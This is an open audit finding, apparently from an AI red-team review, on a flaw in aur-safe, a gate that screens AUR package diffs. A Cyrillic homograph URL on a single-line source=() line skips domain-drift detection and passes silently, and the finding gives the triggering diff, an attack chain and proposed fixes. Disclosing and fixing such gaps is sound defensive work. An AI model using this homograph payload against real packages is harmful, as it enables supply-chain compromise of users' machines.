# Finding E — IDN homograph `source=()` URL bypass → silent exit 0

**Source:** glm-5.1 red-team review, session `019f0517-d737-732f-b8d6-6ae4c3208309`  
**Status:** open  
**Severity:** critical  
**Lines:** `source_domains()` at aur-safe:232-236, `classify_diff_rules()` at aur-safe:795-803, `_boring_added_line_class()` at aur-safe:273

## What happens

A homograph `source=()` URL swap (the exact example from the threat model —
`іnstall.example-clі.dev` with Cyrillic `і` U+0456) bypasses both domain-drift
detection AND the boring classifier, producing a silent exit 0.

**Code path:**

1. `source_domains()` line 232-236 — awk prints the `source=(...)` block, then
   `grep -aoE '://[a-zA-Z0-9._-]+'` extracts the hostname. The character class
   is **strict ASCII**. A hostname starting with non-ASCII produces zero extracted
   chars → `new_s=""`.

2. `classify_diff_rules()` line 795-803 — `if [[ -n "$new_s" ]]` is false on an
   empty result → domain drift check **skipped entirely**.

3. `_boring_added_line_class()` line 273 —
   `'^[[:space:]]*source=\(.*\)[[:space:]]*$'` matches the single-line
   `source=('https://іnstall.example-clі.dev/...')` → returns **0 (boring)**.

4. `scan_diff_rules()` line 867-906 — `boring` → return 0 → caller stages X →
   user is told `ok`.

**Triggering diff:**
```diff
-source=('https://install.example-cli.dev/foo-1.0.tar.gz')
+source=('https://іnstall.example-clі.dev/foo-2.0.tar.gz')
```

(`і` = U+0456 both before the `n` and in `clіdev`. Single-quoted single-line
form — the default makepkg style.)

**Note on multi-line mitigation:** If the attacker uses multi-line `source=()`,
the URL alternative `[A-Za-z]://[^\x27\x22[:space:]]+` matches in the URL pattern
(since URL body chunks include non-ASCII) → `boring_edge` → exit 2 → safety net
engages. Only the single-line form is the silent bypass — but the single-line
form is makepkg's default AND the threat model's exact example.

## Exploitability

**High.** Attacker maintains AUR package P with prior clean baseline. Pushes
commit X with homograph URL on single-line `source=(...)` + matching
`pkgver`/`pkgrel` literal bumps (those also auto-classify as boring). `makepkg`
resolves the homograph domain (different DNS) → fetches malicious archive →
`prepare()`/`build()` runs attacker shell at install time → exfiltration. Gate
prints `ok`, exit 0 — no consent, no explanation. Stage X → next gate diffs
malicious X..origin/master → silent onward.

## Fix

Any one of:
- Add a hard RULE matching non-ASCII chars in any `source=` / `source_*=()` line
  (cheap, no FP risk: ASCII-only is the de facto standard).
- Extend `source_domains` regex to include multi-byte hosts
  (e.g. `://[^/"'\x20]+` then punycode-normalize for set-diff); ASCII host vs
  Cyrillic host WILL register as drift.
- Refuse to classify a `source=(...)` line as boring if it contains any byte ≥ 0x80.

## Test gap

No selftest for non-ASCII in `source=()` lines. A fixture with a Cyrillic
homograph URL should verify exit ≠ 0 (at minimum review, preferably hard-fail).
